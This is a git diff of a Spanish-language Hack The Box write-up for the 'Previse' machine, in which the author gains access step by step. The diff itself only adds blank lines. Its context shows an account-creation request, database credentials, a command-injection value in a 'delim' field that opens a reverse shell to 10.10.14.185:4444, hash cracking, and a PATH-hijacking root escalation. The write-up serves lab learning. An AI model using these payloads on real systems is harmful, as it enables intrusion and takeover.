@@ -139,9 +139,11 @@ Content-Type: application/x-www-form-urlencoded
 username=Tnr1112&password=lalala&confirm=lalala
 ```
 ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/accountsPOST.jpg "AccountsPOST")
+
 Como vemos, dice _Success! User was added!_, así que resta loguearnos con esta cuenta para ingresar al archivo _files.php_
 
 ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/files.jpg "Files")
+
 Vamos a descargar el _SITEBACKUP.zip_
 ```bash
 drwxr-xr-x root    root     286 B  Tue Jan 25 10:46:12 2022  .
@@ -162,6 +164,7 @@ drwxr-xr-x root    root      52 B  Tue Jan 25 10:03:44 2022  ..
 .rw-r--r-- root    root     1.9 KB Wed Jun  9 09:40:24 2021  status.php
 ```
 Hay varios archivos, vamos a entrar al _config.php_
+
 ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/configFile.jpg "ConfigFile")
 
 Hay credenciales de base de datos, nos pueden servir para después.
@@ -193,12 +196,14 @@ Upgrade-Insecure-Requests: 1
 delim=comma%26/bin/bash+-c+'bash+-i+>+/dev/tcp/10.10.14.185/4444+0>%261'
 ```
 Y efectivamente, somos _www-data_
+
 ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/revShell.jpg "RevShell")
 
 Ahora vamos a revisar la base de datos con las credenciales que encontramos anteriormente.
 `myqsl -uroot -pmySQL_p@ssw0rd\!\:\)`
 
 Vemos que hay una tabla de `accounts` con el usuario _m4lwhere_ y una contraseña hasheada.
+
 ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/database.jpg "Database")
 
 Para identificar el tipo de hash, vamos a ejecutar `hashcat --example-hashes | grep '\$1' -B4`
@@ -239,13 +244,17 @@ Lo que podemos hacer es editar el _PATH_ del comando gzip para que el programa q
 `export PATH=:/home/m4lwhere:$PATH`
 
 Creamos una bash en el gzip que tomará el _PATH_
+
 `echo "/bin/bash" > /home/m4lwhere/gzip`
 
 Le damos permisos.
+
 `chmod 777 /home/m4lwhere/gzip`
 
 Lo ejecutamos.
+
 `sudo /opt/scripts/access_backup.sh`
 
 Y obtenemos una **shell** como **root** :)
+
 ![](https://github.com/Tnr1112/HTB-Writeups/blob/main/Machines-Maquinas/Easy-Facil/Linux/Previse/images/root.jpg "Root")
